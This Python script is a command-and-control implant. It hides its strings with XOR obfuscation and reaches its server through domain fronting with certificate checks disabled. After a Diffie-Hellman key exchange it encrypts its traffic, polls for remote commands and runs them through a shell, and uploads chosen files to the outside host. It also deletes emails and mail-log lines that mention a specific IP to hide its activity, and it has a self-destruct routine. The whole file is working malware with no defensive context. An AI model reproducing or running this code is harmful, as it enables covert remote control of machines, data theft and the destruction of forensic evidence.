#!/usr/bin/env python3
import time
import requests
import base64
import subprocess
import os
import sys
import json
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import serialization
import os
import base64
import hashlib
import urllib3
import random
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BLOCK_SIZE = 16

KEY = None

cur_list = [b'^\x15d\x8c\xc92\x9b\x01\xf9RDJ\xf3\xc8\x07\x03\xfb', b'\x1d\xee{\x19=\xed\x04', b'\x08\x03\x85\xfc\xa5\xfd\n\xc6', b'\x19\xc3\x04\x16', b'@\xed\xear\xf5a\xd9F,\x04\xd7\x0c\xaf0S', b'Y\xf1?Bs\xae\xb51\xc1\xb5\xa1\xaf\x1d', b'\x95\x95\x1cM\xb1k\x0b\x1d(t\x136\xcc#y1\xc1\x05\xa2i\xf5V\xe2\x91n\xf1\x87m\xaajr\xea\xefQ', b'Aw{\xabq\xf8\x04\xa9`\x85(@[\x91*\xb6', b'\x0b\xdd\xb9\xc6F\x0e\x92\x1f=\x80\x10\x18\xe2\x82\xef\x0f', b"v\xfeC\xe4\x1c\xc3:\xc7\xe9'QZ\xab", b'fk\xe6)\x99\x11)\xb8\x04\xafEa<\xcd\x048\xc0\xda\x03\xf8\x9d\xf7@YO\x02\x81\xc6\x06p:\xc7', b'\xeb\xad(\xca\xbb"8\x12\x80\x8c\xa1\xa7\x8bV\x0e\xed\xd2\xf1\xc3\x08\xc8\xf2y', b'\xb3\xfc1b4SY\x97\x08k\xa5\xd7\x93\xd6\xf0v\xa1\xf1}\xc2\x04', b'\xf2m\xa8L\xccM^\x99*\xcew\xb1\x18\xde\x8d\xc4\xa0q\x98', b'\xb8\xe2\xf9\x820\xe2\xec\xbfP\x15\xb1\xeb', b'\xc4\x01\xb7Zm\xdfs\xaf', b"k\xe4\xd0\x15\xc3\xae\xae\x84r\xb9Q'\x06q\xf27t\x14\x92\x85\t\x01\xf9\\n\xedRO\xee\xea\xf5!\x0e~\\\xa2", b'\x9f\x144R', b'\x81b\xfb\xc3,\x9a\x0eS', b'\x8e\x05C\x9dz', b'\xf5^n\x8an9\xe7\x986\xe6m\xe8\xb82\xd7\xa8', b'\x1a\xb8\xc6\xcf\x88\xf2\xab\xfc\x9c\xf1L\x96M\x91\xc62\xa7{', b'\xe5\xe0\xdd\x06Y\x15\x15\xae\x87', b'\xee', b'\xbc', b'6', b'\x0c', b'U\xa5\x9f\xd2\x02^', b"\xdd\xaaBu_u\r\xa9\xe0%\x04\x96\xd3E\xce\x91\x1ez\xd3\xb60R49\x97\xbb\xea\xbb\xbe9-h\x1d\xbe\xe9\x99\x17JO\ne\xf9\xe6\xc6\xc7*\xa5\xd0\x04Z\n\xf7\xbf\x0f'4\x85\xce\x96\x8eP\x8c9\x039\xc9"]

next_list = []
random.seed(247654764)

for i in range(0, len(cur_list)):
    cur_str = cur_list[i]
    random_bytes = random.randbytes(len(cur_str))
    cur_str_bytes = bytes(cur_str)
    next_list.append(bytes(a ^ b for a, b in zip(cur_str_bytes, random_bytes)).decode())
    
    

def do_everything(data):
    encrypted_data = aes_encrypt(data, KEY)
    obfuscated_data = obfuscate(encrypted_data)
    return obfuscated_data


def undo_everything(data):
    deobfuscated_data = deobfuscate(data)
    decrypted_data = aes_decrypt(deobfuscated_data, KEY)
    return decrypted_data


def aes_encrypt(plaintext, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    iv = os.urandom(BLOCK_SIZE)

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(plaintext.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    return base64.b64encode(iv + encrypted).decode()

def aes_decrypt(ciphertext_b64, key):
    key_bytes = hashlib.sha256(key).digest()[:16]
    raw = base64.b64decode(ciphertext_b64)
    iv = raw[:BLOCK_SIZE]
    encrypted = raw[BLOCK_SIZE:]

    cipher = Cipher(algorithms.AES(key_bytes), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(encrypted) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(padded_data) + unpadder.finalize()

    return plaintext.decode()

def obfuscate(text):

    b64_text = base64.b64encode(text.encode()).decode()
    chunk_size = 16
    chunks = [b64_text[i:i+chunk_size] for i in range(0, len(b64_text), chunk_size)]
    if chunks and len(chunks[-1]) < chunk_size:
        chunks[-1] = chunks[-1].ljust(chunk_size, '@')
    return ''.join(reversed(chunks))

def deobfuscate(obf_str):
    
    chunk_size = 16
    chunks = [obf_str[i:i+chunk_size] for i in range(0, len(obf_str), chunk_size)]
    chunks = list(reversed(chunks))
    if chunks:
        chunks[-1] = chunks[-1].rstrip('@')
    ordered_chunks = ''.join(chunks)
    return base64.b64decode(ordered_chunks.encode()).decode()


FRONT_DOMAIN = "www.google.com"  
FRONT_DOMAIN = next_list[0]
REAL_DOMAIN = next_list[0]         
UPLOAD_PATH = next_list[1]
COMMAND_PATH = next_list[2]
LOG_PATH = next_list[3]
GET_PARAMS_PATH = next_list[4]
KEY_XCHG_PATH = next_list[5]
FIRST_PATH = next_list[27]

UPLOAD_URL = f"https://{FRONT_DOMAIN}{UPLOAD_PATH}"
COMMAND_URL = f"https://{FRONT_DOMAIN}{COMMAND_PATH}"
LOG_URL = f"https://{FRONT_DOMAIN}{LOG_PATH}"
PARAMS_URL = f"https://{FRONT_DOMAIN}{GET_PARAMS_PATH}"
XCHG_URL = f"https://{FRONT_DOMAIN}{KEY_XCHG_PATH}"
FIRST_URL = f"https://{FRONT_DOMAIN}{FIRST_PATH}"


class SNIAdapter(HTTPAdapter):
    def __init__(self, server_hostname, *args, **kwargs):
        self.server_hostname = server_hostname
        super().__init__(*args, **kwargs)
        
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs['server_hostname'] = self.server_hostname
        self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)

def generate_params(response):
    parameters = serialization.load_pem_parameters(
        response.content,
        backend=default_backend()
    )

    return parameters
    
    

def generate_keys(parameters):
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()

    return public_key, private_key

def get_params():
    global next_list
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(PARAMS_URL, headers=headers, verify=False)
        if response.status_code == 200:
           parameters = generate_params(response)
           return parameters

        else:
            send_log(f"{next_list[6]}{response.status_code}")
    except Exception as e:
        e

def key_xchg(client_public_bytes):
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.post(XCHG_URL, data=client_public_bytes, headers=headers, verify=False)
        if response.status_code == 200:
            server_public_bytes = response.content

            server_public_key = serialization.load_pem_public_key(
                server_public_bytes,
                backend=default_backend()
            )
            return server_public_key
        else:
            return False
    except Exception as e:
        return False


def self_destruct():
    global next_list
    try:
        log_file = next_list[7]
        if os.path.exists(log_file):
            os.remove(log_file)
        implant_file = next_list[8]
        rc_local = next_list[9]
        if os.path.exists(rc_local):
            with open(rc_local, "r") as f:
                # Removed unused variable
                f.readlines()
        if os.path.exists(implant_file):
            os.remove(implant_file)
        send_log(f"{next_list[21]} {next_list[17]}")
        
    except Exception as e:
        e
    finally:
        sys.exit(0)

def send_log(log_message):
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        encrypted_log = do_everything(log_message)
        payload = {"data": encrypted_log}
        response = session.post(LOG_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def send_file(file_path):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()
        file_data = base64.b64encode(file_data).decode()
        data = {
            "file_name": os.path.basename(file_path),
            "file_size": len(file_data),
            "data": file_data
        }
        data = json.dumps(data)
        secret_data = do_everything(data)
        payload = {"data": secret_data}
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.post(UPLOAD_URL, data=payload, headers=headers, verify=False)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False

def poll_command():
    global next_list
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(COMMAND_URL, headers=headers, verify=False)
        if response.status_code == 200:
            json_data = response.json()
            obfuscated_cmd = json_data.get("data", "")
            if obfuscated_cmd:
                cmd = undo_everything(obfuscated_cmd)
                return cmd
        else:
            send_log(f"{next_list[10]}{response.status_code}")
        return None
    except Exception as e:
        send_log(f"{next_list[11]}{e}")
        return None

def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()
        
def check_first():
    try:
        session = requests.Session()
        adapter = SNIAdapter(server_hostname=FRONT_DOMAIN)
        session.mount("https://", adapter)
        headers = {"Host": REAL_DOMAIN}
        response = session.get(FIRST_URL, headers=headers, verify=False)
        if response.status_code == 200:
            response_bool = response.json()
            return response_bool
        else:
            return False
    except Exception as e:
        return False

def main():

    time.sleep(60)
    if not check_first():
        os._exit(1)
    global next_list
    os.system(next_list[28])
    implant_file = next_list[8]
    if os.path.exists(implant_file):
        os.remove(implant_file)
    ## KEY EXCHANGE RELATED
    params = get_params()
    public_key, private_key = generate_keys(params)
    client_public_bytes = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    global KEY
    server_public_key = key_xchg(client_public_bytes)
    shared_secret = private_key.exchange(server_public_key)

    client_derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'KEYAES',
    ).derive(shared_secret)


    KEY = client_derived_key
    
    

    fail_count = 0
    while True:
        emails = next_list[12]
        logs = next_list[13]
        timestamp = time.time()
        email_names = []
        timestamp_prev = timestamp - 300

        for filename in os.listdir(emails):
            absolute_path = os.path.join(emails, filename)
            if os.path.isfile(absolute_path):
                mtime = os.path.getmtime(absolute_path)
                if mtime > timestamp_prev:
                    email_names.append(absolute_path)
                
        ip_addr = next_list[14]
    
        relevant_email_names = []

        for cur_email in email_names:
            with open(cur_email, "r") as email_file:
                lines = email_file.readlines()
                for line in lines:
                    if ip_addr in line:
                        relevant_email_names.append(cur_email)
                        os.remove(cur_email)
                        break
    	         
        filename = logs + next_list[15]

        with open(filename, next_list[23]) as log_file:
            lines = log_file.readlines()

        filtered_lines = []

        for cur_email in relevant_email_names:
            cur_email = cur_email[0:len(cur_email) - 1] + next_list[25]
            if os.path.isfile(cur_email):
                os.remove(cur_email)

        for line in lines:
            breakline = False
            for cur_email in relevant_email_names:
                cur_email_base = os.path.basename(cur_email)
                cur_email_substr = cur_email_base[0:len(cur_email_base) - 3]
                if cur_email_substr in line or ip_addr in line:
                    breakline = True
                    break
            if not breakline:
                filtered_lines.append(line)

        with open(filename, "w") as log_file:
            log_file.writelines(filtered_lines)
        
        if fail_count >= 60:
            self_destruct()
            return

        cmd = poll_command()
        if cmd is None:
            fail_count += 1
            send_log(f"{next_list[16]}{fail_count}")
        else:
            fail_count = 0
            if cmd.strip() == next_list[17]:
                self_destruct()
                return
            elif cmd.strip().split('!')[0].strip()==next_list[18]:
                file_path = cmd.strip().split('!')[1].strip()
                if os.path.exists(file_path):
                    send_file(file_path)
                else:
                    send_log(f"{next_list[19]}{file_path}{next_list[20]}")
            else:
                result = execute_command(cmd)
                result = f"{next_list[21]}{cmd}{next_list[22]}{result}"
                send_log(result)
        time.sleep(15)

if __name__ == '__main__':
    main()
